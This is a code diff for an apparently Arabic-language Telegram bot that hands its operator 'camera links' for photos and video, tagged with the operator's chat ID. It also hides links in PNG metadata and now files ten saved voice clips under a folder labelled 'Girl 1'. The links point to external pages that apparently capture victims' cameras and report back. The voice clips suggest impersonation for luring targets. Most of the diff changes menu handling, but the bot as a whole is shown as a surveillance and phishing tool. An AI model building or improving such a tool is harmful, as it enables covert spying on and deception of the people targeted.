@@ -41,7 +41,7 @@ def hide_link_in_metadata(image_path, link, output_path):
     meta.add_text("URL_LINK", link)
     img.save(output_path, "PNG", pnginfo=meta)
 
-# --- واجهة البوت ---
+# --- واجهة البوت الرئيسية ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -53,7 +53,7 @@ def send_welcome(message):
     )
     bot.send_message(message.chat.id, "أهلاً المطور سيف الدين، اختر الخدمة:", reply_markup=markup)
 
-# --- معالجة الأزرار ---
+# --- معالجة الأزرار والـ Callback ---
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     chat_id = call.message.chat.id
@@ -67,19 +67,40 @@ def handle_query(call):
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
     
+    # خطوة 1: عند الضغط على قسم الصوتيات يظهر زر "الفتاة 1"
     elif call.data == "voice_menu":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
+        markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
+        bot.edit_message_text("اختر المجلد المطلوب:", chat_id, call.message.message_id, reply_markup=markup)
+
+    # خطوة 2: عند الضغط على "الفتاة 1" تظهر المقاطع العشرة كاملة
+    elif call.data == "girl_1_menu":
         if not db:
-            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً! قم بإرسال البصمات الصوتية للبوت ليتم حفظها تلقائياً.")
+            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً! أرسل البصمات للبوت ليحفظها.")
             return
         
         markup = types.InlineKeyboardMarkup(row_width=2)
-        # ترتيب الأزرار تصاعدياً من مقطع 1 إلى مقطع 10
-        sorted_keys = sorted(db.keys(), key=lambda x: int(x.split()[1]) if len(x.split()) > 1 and x.split()[1].isdigit() else 0)
-        for name in sorted_keys:
-            markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
-            
-        bot.edit_message_text("اختر المقطع المطلوب تشغيله:", chat_id, call.message.message_id, reply_markup=markup)
         
+        # كود ذكي لترتيب الأزرار من 1 إلى 10 بدون أي نقص أو تداخل
+        for i in range(1, 11):
+            name = f"مقطع {i}"
+            if name in db:
+                markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
+                
+        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
+        bot.edit_message_text("📂 مقاطع الفتاة 1 (10 مقاطع):", chat_id, call.message.message_id, reply_markup=markup)
+        
+    elif call.data == "main_menu":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
+            types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
+            types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
+            types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
+        )
+        bot.edit_message_text("أهلاً المطور سيف الدين، اختر الخدمة:", chat_id, call.message.message_id, reply_markup=markup)
+
     elif call.data.startswith("play:"):
         name = call.data.split(":")[1]
         file_id = db.get(name)
@@ -87,9 +108,9 @@ def handle_query(call):
             try: 
                 bot.send_voice(chat_id, file_id)
             except Exception as e: 
-                bot.answer_callback_query(call.id, "❌ الـ ID الخاص بهذا المقطع منتهي الصلاحية! يرجى إعادة إرسال المقطع للبوت لتحديثه.")
+                bot.answer_callback_query(call.id, f"❌ الـ ID الخاص بـ {name} منتهي! أعد إرساله للبوت لتحديثه.")
         else:
-            bot.answer_callback_query(call.id, "❌ لم يتم العثور على المقطع.")
+            bot.answer_callback_query(call.id, f"❌ {name} غير محفوظ بعد.")
 
 # --- المعالج العام لاستلام الأصوات، الصور والنصوص ---
 @bot.message_handler(content_types=['photo', 'text', 'voice'])
@@ -97,21 +118,26 @@ def handle_all(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
 
-    # 1. ميزة الحفظ والتحديث التلقائي للمقاطع عند إرسالها للبوت
+    # استقبال وحفظ المقاطع بشكل آمن جداً ومضمون من 1 إلى 10 بدون أخطاء
     if message.voice:
         db = load_db()
-        count = len(db) + 1
         
-        # إذا كانت القاعدة ممتلئة بـ 10 مقاطع وتريد إعادة التحديث من البداية عند الإرسال من جديد
-        if count > 10:
-            count = 1
+        # البحث عن أول رقم مقطع فارغ من 1 إلى 10 لملئه، وإذا كانت ممتلئة يحدّث من مقطع 1
+        target_slot = None
+        for i in range(1, 11):
+            if f"مقطع {i}" not in db:
+                target_slot = i
+                break
+        
+        if target_slot is None:
+            target_slot = 1  # إعادة البدء والتحديث من مقطع 1 إذا أرسلت مقاطع جديدة
             
-        name = f"مقطع {count}"
+        name = f"مقطع {target_slot}"
         db[name] = message.voice.file_id
         save_db(db)
-        bot.reply_to(message, f"✅ تم حفظ وتحديث الـ ID الخاص بـ ({name}) في ملف الحفظ بنجاح!")
+        bot.reply_to(message, f"✅ تم حفظ وتحديث الـ ID الخاص بـ ({name}) في مجلد الفتاة 1 بنجاح!")
     
-    # 2. معالجة الحقن (خطوة 1: استلام الصورة)
+    # معالجة الحقن (خطوة 1: استلام الصورة)
     elif state == "waiting_for_image_inject" and message.photo:
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded = bot.download_file(file_info.file_path)
@@ -121,7 +147,7 @@ def handle_all(message):
         user_states[chat_id] = "waiting_for_link"
         bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن:")
 
-    # 3. معالجة الحقن (خطوة 2: استلام الرابط)
+    # معالجة الحقن (خطوة 2: استلام الرابط)
     elif state == "waiting_for_link" and message.text:
         img_path = user_data.get(chat_id)
         out_path = f"out_{chat_id}.png"
